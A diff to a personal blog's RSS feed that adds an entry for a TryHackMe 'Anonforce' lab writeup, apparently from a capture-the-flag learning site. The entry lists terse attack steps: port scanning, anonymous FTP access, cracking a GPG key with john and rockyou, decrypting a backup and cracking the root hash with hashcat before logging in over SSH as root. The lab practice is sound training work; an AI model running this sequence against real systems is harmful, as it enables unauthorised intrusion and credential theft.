@@ -9,6 +9,24 @@
     <copyright>© 2024 </copyright>
     <lastBuildDate>Wed, 19 Jun 2024 00:00:00 +0000</lastBuildDate><atom:link href="//localhost:1313/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Anonforce</title>
+      <link>//localhost:1313/tryhackme/anonforce/</link>
+      <pubDate>Wed, 19 Jun 2024 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/tryhackme/anonforce/</guid>
+      <description>Writeup: YouTube // Blog
+rustscan -a $ip, 21:ftp 22:ssh
+ftp $ip, anonymous
+user = m*******
+get user.txt
+cat ~/user.txt get /notread/*
+gpg2john private.asc &amp;gt; private.hash john --wordlist=/rockyou.txt private.hash x****** gpg 🔗 🔗
+gpg -d backup.pgp nano root.hash
+hashcat root.hash rockyou.txt h***** ssh root@$ip</description>
+      
+    </item>
+    
+    <item>
       <title>Blog Post</title>
       <link>//localhost:1313/posts/blog-post/</link>
       <pubDate>Wed, 19 Jun 2024 00:00:00 +0000</pubDate>
